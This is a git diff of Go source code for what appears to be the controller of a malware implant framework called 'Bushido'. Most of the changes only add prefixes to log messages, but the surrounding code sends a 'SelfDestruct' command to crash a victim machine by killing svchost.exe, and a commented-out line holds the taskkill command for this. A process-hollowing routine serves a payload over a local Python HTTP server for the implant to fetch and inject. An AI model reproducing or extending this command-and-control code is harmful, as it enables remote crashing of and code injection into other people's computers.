@@ -76,9 +76,9 @@ func bsod(conn *net.Conn) bool { //Works but implant should be running as admin
 	// fmt.Println("Initiating BSOD by killing")
 	// (*conn).Write([]byte("taskkill.exe /f /im svchost.exe"))
 	// fmt.Println("Kill Signal Sent")
-	fmt.Println("Initiating BSOD by killing svchost.exe")
+	fmt.Println("[!]Initiating BSOD by killing svchost.exe")
 	(*conn).Write([]byte("SelfDestruct\n"))
-	fmt.Println("Kill Signal Sent")
+	fmt.Println("[+]Kill Signal Sent")
 	reply := make([]byte, 9000)
 	(*conn).SetReadDeadline(time.Now().Add(15 * time.Second))
 
@@ -167,7 +167,7 @@ func pwd(conn *net.Conn) {
 func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
 	_, err := os.Stat(filePathLocal)
 	if err != nil {
-		fmt.Println("Couldn't read the file on the local machine !")
+		fmt.Println("[-]Couldn't read the file on the local machine !")
 		return
 	}
 	//now we enter the hollowing function
@@ -176,11 +176,11 @@ func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
 	(*conn).Write([]byte("hollow\n"))
 	read_len, err := (*conn).Read(buffer)
 	if err != nil {
-		fmt.Println("Error Reading From Buffer")
+		fmt.Println("[-]Error Reading From Buffer")
 		return
 	}
 	if read_len <= 1 {
-		fmt.Println("Error with length of Buffer")
+		fmt.Println("[-]Error with length of Buffer")
 		return
 	}
 	bufferSnapped := buffer[:read_len]
@@ -193,13 +193,12 @@ func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
 	fmt.Println("[*]Writing the Remote Path ...")
 	(*conn).Write([]byte(filePathRemote))
 	read_len, err = (*conn).Read(buffer)
-	fmt.Println(read_len)
 	if err != nil {
-		fmt.Println("Error Reading From Buffer")
+		fmt.Println("[-]Error Reading From Buffer")
 		return
 	}
 	if read_len <= 1 {
-		fmt.Println("Error with length of buffer")
+		fmt.Println("[-]Error with length of buffer")
 		return
 	}
 	bufferSnapped = buffer[:read_len]
@@ -212,6 +211,7 @@ func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
 	cmd := exec.Command("./scripts/pythonServer.sh")
 	cmd.Run()
 	fmt.Println("[*]Started python HTTP Server in Bushido dir")
+	fmt.Println("[!]Manually terminate the HTTP server after the client recieves the file !")
 	fmt.Println("[*]Waiting for hollowing to finish ...")
 	read_len, err = (*conn).Read(buffer)
 	if err != nil {
@@ -230,4 +230,5 @@ func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
 		return
 	}
 	fmt.Println("[+]Successful Proccess Hollowing !")
+	fmt.Println()
 }
